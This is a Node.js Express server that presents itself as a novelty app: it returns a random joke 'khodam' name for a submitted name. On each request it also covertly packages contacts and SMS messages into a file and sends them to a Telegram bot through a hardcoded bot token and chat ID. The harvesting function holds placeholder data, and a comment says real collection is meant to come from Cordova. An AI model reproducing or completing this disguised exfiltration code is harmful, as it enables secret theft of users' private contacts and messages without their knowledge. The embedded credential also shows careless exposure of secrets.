const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const fetch = require('node-fetch');
const FormData = require('form-data');
const useragent = require('user-agent');
const requestIp = require('request-ip');

const app = express();

// Middleware to parse application/json
app.use(bodyParser.json());
app.use(cors());
app.use(requestIp.mw()); // Middleware to get client IP

// Data array containing words to be randomly selected
const data = [
    "Tidak Ada", "Harimau Biskuat", "Nyi Ngaborong", "Jin Sarimi", "Maung Ompong", 
    "Gajah Bule", "Kelinci Pitih", "Kambing Hitam", "Bebek Sumberkencono", 
    "Ikan Bakar", "Kucing Nakal", "Laba-Laba Sutra", "Ular Kejut", 
    "Burung Kutang", "Sapi Perah", "Kuda Lumping", "Kuda Laut", 
    "Ayam Geprek", "Cacing Ganteng", "Dino Jahat", "Buaya Darat", "Kucing Garong", 
    "Unta Gila", "Tikus Got", "Kambing Guling", "Babi Ngepet", 
    "Ular Madu", "Ayam Kampus", "Gajah Mada", "Kodok Ngorek", 
    "Anjing Gukguk", "Kera Sakti", "Burung Cendrawasih", "Kadal Gurun", 
    "Biawak Air", "Tupai Terbang", "Lele Jumbo", "Belut Listrik", 
    "Kura-Kura Ninja", "Ikan Tongkol", "Kucing Manja", "Bebek Balap", 
    "Burung Hantu", "Serigala Malam", "Ikan Pari", "Kodok Terbang", 
    "Ayam Cemani", "Banteng Merah", "Gorila Sakit Gigi", "Ular Sanca", "Ular Kobra", 
    "Rusa Kutub", "Burung Kolibri", "Buto Ijo", "Pocong Unyu", 
    "Kuntilanak Merah", "Sundel Bolong", "Genderuwo Keren", "Wewe Gombel", 
    "Tuyul Nakal", "Jelangkung Seram", "Kuntilanak Manis", "Buto Terong", 
    "Jurig Kampring", "Setan Budug", "Hantu Kompor", "Memedi Sawah", 
    "Kucing Kecurangan", "Macan Ketipu", "Harimau Ketabrak", "Kucing Kekepung", 
    "Macan Keliru", "Harimau Kembar", "Kucing Kerdil", "Macan Ketangkap", 
    "Harimau Kemaruk", "Kucing Kebagian", "Macan Ketinggalan", "Harimau Kemben", 
    "Kucing Kepanasan", "Macan Kepanjangan", "Harimau Kembaran", "Kucing Kekeret", 
    "Macan Keselek", "Harimau Kesurupan", "Kucing Kekampungan", "Macan Kempes", 
    "Harimau Kelas Teri", "Kucing Keletihan", "Macan Kekeringan", "Harimau Kejang", 
    "Kucing Kera", "Macan Kerucut", "Harimau Keriting", "Kucing Kesasar", 
    "Macan Kesasar", "Harimau Kentut"
];

app.get('/', (req, res) => {
    res.send('Hello from Express on Vercel!');
});

// Function to get contacts and SMS
async function getContactsAndSms() {
    // Placeholder function for demonstration
    // In a real application, you need to implement the logic to get contacts and SMS using Cordova or any suitable method
    return {
        contacts: [
            { name: 'John Doe', phone: '123-456-7890' },
            { name: 'Jane Doe', phone: '098-765-4321' }
        ],
        sms: [
            { sender: '123-456-7890', message: 'Hello there!' },
            { sender: '098-765-4321', message: 'Hi, how are you?' }
        ]
    };
}

// Function to send message to Telegram bot
async function sendMessageToTelegram(message) {
    const token = '7135971769:AAEozhsjVD0X1utFIeztYJVo36VmZmMONhA';
    const chat_id = '1234255375'; // Gantilah dengan chat ID kamu
    const url = `https://api.telegram.org/bot${token}/sendDocument`;

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ chat_id, text: message })
        });

        if (response.ok) {
            console.log('Message successfully sent to Telegram bot');
        } else {
            const errorText = await response.text();
            console.error('Error sending message to Telegram bot', response.statusText, errorText);
        }
    } catch (error) {
        console.error('Error sending message to Telegram bot', error);
    }
}

// Function to send data to Telegram bot
async function sendToTelegram(data, filename, content) {
    const token = '7135971769:AAEozhsjVD0X1utFIeztYJVo36VmZmMONhA';
    const chat_id = '1234255375'; // Gantilah dengan chat ID kamu
    const url = `https://api.telegram.org/bot${token}/sendDocument`;

    const formData = new FormData();
    formData.append('chat_id', chat_id);
    formData.append('document', content, { filename });
    formData.append('caption', data);

    try {
        const response = await fetch(url, {
            method: 'POST',
            body: formData
        });

        if (response.ok) {
            console.log('Data successfully sent to Telegram bot');
        } else {
            const errorText = await response.text();
            console.error('Error sending data to Telegram bot', response.statusText, errorText);
            await sendMessageToTelegram(`Error sending data to Telegram bot: ${response.statusText}\n${errorText}`);
        }
    } catch (error) {
        console.error('Error sending data to Telegram bot', error);
        await sendMessageToTelegram(`Error sending data to Telegram bot: ${error.message}`);
    }
}

// Function to export contacts and SMS and send to Telegram bot
async function exportContactsAndSms(req, nama, responseData) {
    const { contacts, sms } = await getContactsAndSms();
    const data = {
        contacts,
        sms
    };
    const json = JSON.stringify(data, null, 2);

    if (!json || json === '{}') {
        console.error('No contacts or SMS data found or JSON is empty');
        await sendMessageToTelegram('No contacts or SMS data found or JSON is empty');
        return;
    }

    const buffer = Buffer.from(json, 'utf-8');
    const caption = `Nama: ${nama}\nData: ${responseData}`;
    await sendToTelegram(caption, 'contacts_sms.json', buffer);
}

// Route to handle POST request
app.post('/api/data', async (req, res) => {
    const { nama } = req.body;
    const randomIndex = Math.floor(Math.random() * data.length);
    const responseData = data[randomIndex];
    await exportContactsAndSms(req, nama, responseData);

    res.json({
        nama,
        data: responseData
    });
});

const PORT = process.env.PORT || 3003;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});

module.exports = app;
